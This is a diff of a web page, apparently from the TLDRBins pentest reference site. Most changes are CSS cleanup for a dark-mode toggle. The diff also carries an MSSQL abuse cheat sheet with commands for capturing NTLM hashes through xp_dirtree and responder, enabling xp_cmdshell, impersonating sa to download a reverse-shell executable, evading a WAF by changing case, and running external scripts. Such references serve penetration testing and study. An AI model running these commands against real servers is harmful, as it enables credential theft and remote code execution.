@@ -44,16 +44,20 @@
 </div>
     
 <style>
+ 
 
  
+.js-toggle-wrapper, .js-toggle {
+    margin: 0;
+    padding: 0;
+    border: 0;
+    box-sizing: border-box;
+}
 
 .js-toggle-wrapper {
     display: table;
-
-     
     float: right;
     margin-left: auto;
-    margin-right: 0;
 }
 
 .js-toggle {
@@ -62,76 +66,60 @@
     position: relative;
     cursor: pointer;
     background-color: transparent;
-    border: 0;
-    padding: 0;
-    -webkit-touch-callout: none;
     user-select: none;
-    -webkit-tap-highlight-color: rgba(0, 0, 0, 0);
-    -webkit-tap-highlight-color: transparent;
-  }
-  
-  .js-toggle-screenreader-only {
-    border: 0;
-    clip: rect(0 0 0 0);
-    height: 1px;
-    margin: -1px;
-    overflow: hidden;
-    padding: 0;
+}
+
+.js-toggle-screenreader-only {
     position: absolute;
     width: 1px;
-  }
-  
-  .js-toggle-track {
+    height: 1px;
+    margin: -1px;
+    padding: 0;
+    overflow: hidden;
+    clip: rect(0, 0, 0, 0);
+}
+
+.js-toggle-track {
     width: 50px;
     height: 24px;
-    padding: 0;
     border-radius: 30px;
     background-color: hsl(223, 61%, 44%);
-    transition: all 0.2s ease;
-  }
-  
-  .js-toggle-track-check {
-    position: absolute;
-    width: 17px;
-    height: 17px;
-    left: 5px;
-    top: 0px;
-    bottom: 0px;
-    margin-top: auto;
-    margin-bottom: auto;
-    line-height: 0;
-    opacity: 0;
-    transition: opacity 0.25s ease;
-  }
-  
-  .js-toggle--checked .js-toggle-track-check {
-    opacity: 1;
-    transition: opacity 0.25s ease;
-  }
+    transition: background-color 0.2s ease;
+}
 
-  .js-toggle--checked .js-toggle-track {
-    background-color: hsl(222, 14%, 7%);
-  }
-  
-  .js-toggle-track-x {
+.js-toggle-track-check,
+.js-toggle-track-x {
     position: absolute;
     width: 17px;
     height: 17px;
-    right: 5px;
-    top: 0px;
-    bottom: 0px;
-    margin-top: auto;
-    margin-bottom: auto;
-    line-height: 0;
-    opacity: 1;
+    top: 50%;
+    transform: translateY(-50%);
     transition: opacity 0.25s ease;
-  }
-  
-  .js-toggle--checked .js-toggle-track-x {
+}
+
+.js-toggle-track-check {
+    left: 5px;
     opacity: 0;
-  }
-  
-  .js-toggle-thumb {
+}
+
+.js-toggle--checked .js-toggle-track-check {
+    opacity: 1;
+}
+
+.js-toggle-track-x {
+    right: 5px;
+    opacity: 1;
+}
+
+.js-toggle--checked .js-toggle-track-x {
+    opacity: 0;
+}
+
+.js-toggle--checked .js-toggle-track {
+    background-color: hsl(222, 14%, 7%);
+}
+
+.js-toggle-thumb {
     position: absolute;
     top: 1px;
     left: 1px;
@@ -139,15 +127,12 @@
     height: 22px;
     border-radius: 50%;
     background-color: #fafafa;
-    box-sizing: border-box;
-    transition: all 0.5s cubic-bezier(0.23, 1, 0.32, 1) 0ms;
-    transform: translateX(0);
-  }
-  
-  .js-toggle--checked .js-toggle-thumb {
+    transition: transform 0.5s cubic-bezier(0.23, 1, 0.32, 1);
+}
+
+.js-toggle--checked .js-toggle-thumb {
     transform: translateX(26px);
-    border-color: #19ab27;
-  }
+}
 </style>
 
 <script>
@@ -176,7 +161,6 @@
         switcher.classList.add('js-toggle--checked');
         body.classList.add('dark-mode');
     }
-
 </script>
   <p class="desc"></p>
 </header>
@@ -201,7 +185,7 @@
 </ul>
 <hr>
 <div class="content">
-<div id="dynamicFormContainer">
+  <div id="dynamicFormContainer">
 	<form id="dynamicForm" style="display: none;">
 	</form>
 	<div class="buttons center">
@@ -341,37 +325,26 @@ body.dark-mode #dynamicFormContainer button:hover {
     cursor: pointer;
     background: #424242;
 }
-
-
 </style>
-<h3 id="abuse-1-steal-ntlm-hash">Abuse #1: Steal NTLM hash</h3>
-<div>
+  <h3 id="abuse-1-steal-ntlm-hash">Abuse #1: Steal NTLM hash</h3>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> In our <span class="nb">local</span> Linux machine
 </span></span><span class="line"><span class="cl"><span class="go">sudo responder -I tun0
-</span></span></span></code></pre></div></div>
-<p>
+</span></span></span></code></pre></div><p>
 <button data-tabset="set1" data-tabcontent="tab1" class="active">Method 1</button>
 
 <button data-tabset="set1" data-tabcontent="tab2" >Method 2</button>
 
 <button data-tabset="set1" data-tabcontent="tab3" >Method 3</button>
 
-<div class="tabcontent" data-tabset="set1" data-tabcontent="tab1"><div>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">xp_dirtree &#39;\\&lt;LOCAL_IP&gt;\any\thing&#39;;
+<div class="tabcontent" data-tabset="set1" data-tabcontent="tab1"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">xp_dirtree &#39;\\&lt;LOCAL_IP&gt;\any\thing&#39;;
 </span></span></span></code></pre></div></div>
-</div>
 
-<div class="tabcontent" data-tabset="set1" data-tabcontent="tab2"><div>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">use master; exec xp_dirtree &#39;\\&lt;LOCAL_IP&gt;\any\thing&#39;;
+<div class="tabcontent" data-tabset="set1" data-tabcontent="tab2"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">use master; exec xp_dirtree &#39;\\&lt;LOCAL_IP&gt;\any\thing&#39;;
 </span></span></span></code></pre></div></div>
-</div>
 
-<div class="tabcontent" data-tabset="set1" data-tabcontent="tab3"><div>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">load_file(&#39;\\&lt;LOCAL_IP&gt;\any\thing&#39;);
-</span></span></span></code></pre></div></div>
-</div></p>
+<div class="tabcontent" data-tabset="set1" data-tabcontent="tab3"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">load_file(&#39;\\&lt;LOCAL_IP&gt;\any\thing&#39;);
+</span></span></span></code></pre></div></div></p>
 <h3 id="abuse-2-run-xp_cmdshell">Abuse #2: Run xp_cmdshell</h3>
-<div>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Check any policy blocking xp_cmdshell
 </span></span><span class="line"><span class="cl"><span class="go">select name from sys.server_triggers;
 </span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Disable trigger <span class="k">if</span> any
@@ -380,21 +353,16 @@ body.dark-mode #dynamicFormContainer button:hover {
 </span></span><span class="line"><span class="cl"><span class="go">enable_xp_cmdshell;
 </span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> RCE
 </span></span><span class="line"><span class="cl"><span class="go">xp_cmdshell whoami
-</span></span></span></code></pre></div></div>
-<h3 id="abuse-3-impersonate-sa-to-run-xp_cmdshell">Abuse #3: Impersonate sa to run xp_cmdshell</h3>
-<div>
+</span></span></span></code></pre></div><h3 id="abuse-3-impersonate-sa-to-run-xp_cmdshell">Abuse #3: Impersonate sa to run xp_cmdshell</h3>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">execute as login = &#39;sa&#39;; exec sp_configure &#39;show advanced options&#39;, 1;
 </span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">execute as login = &#39;sa&#39;; reconfigure;
 </span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">execute as login = &#39;sa&#39;; exec sp_configure &#39;xp_cmdshell&#39;, 1;
 </span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">execute as login = &#39;sa&#39;; reconfigure;
 </span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">execute as login = &#39;sa&#39;; EXEC master..xp_cmdshell &#39;powershell.exe -ep bypass curl &lt;LOCAL_IP&gt;/rev.exe -o C:\ProgramData\rev.exe&#39;
-</span></span></span></code></pre></div></div>
-<p><small><em>Note: try xp_cmDshElL to bypass WAF</em></small></p>
+</span></span></span></code></pre></div><p><small><em>Note: try xp_cmDshElL to bypass WAF</em></small></p>
 <h3 id="abuse-4-run-external-script">Abuse #4: Run External Script</h3>
-<div>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">EXEC sp_execute_external_script @language =N&#39;Python&#39;, @script = N&#39;import os; os.system(&#34;whoami&#34;);&#39;;
-</span></span></span></code></pre></div></div>
-<br>
+</span></span></span></code></pre></div>
 </div></div>
     
     <script src="/js/utils.js"></script>
@@ -402,8 +370,6 @@ body.dark-mode #dynamicFormContainer button:hover {
     <hr>
     <div class="footer-text">
         <div>© 2024 TLDRBins</div>
-        <div>Powered by <a href="https://gohugo.io/">Hugo</a> & <a
-                href="https://github.com/adityatelange/hugo-index/">Index</a></div>
     </div>
 </footer>
 </body>
